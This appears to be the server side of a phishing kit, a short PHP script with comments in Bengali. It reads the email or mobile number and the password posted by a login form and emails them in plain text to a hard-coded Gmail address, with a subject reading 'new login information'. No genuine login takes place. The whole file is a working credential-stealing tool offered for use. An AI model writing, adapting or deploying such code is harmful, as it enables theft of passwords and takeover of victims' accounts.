<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "hastehena13@gmail.com";  // এখানে আপনার Gmail অ্যাড্রেস লিখুন
    $subject = "নতুন লগইন তথ্য";
    $message = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";
    $headers = "From: no-reply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "তথ্য সফলভাবে পাঠানো হয়েছে!";
    } else {
        echo "তথ্য পাঠাতে সমস্যা হয়েছে!";
    }
}
?>
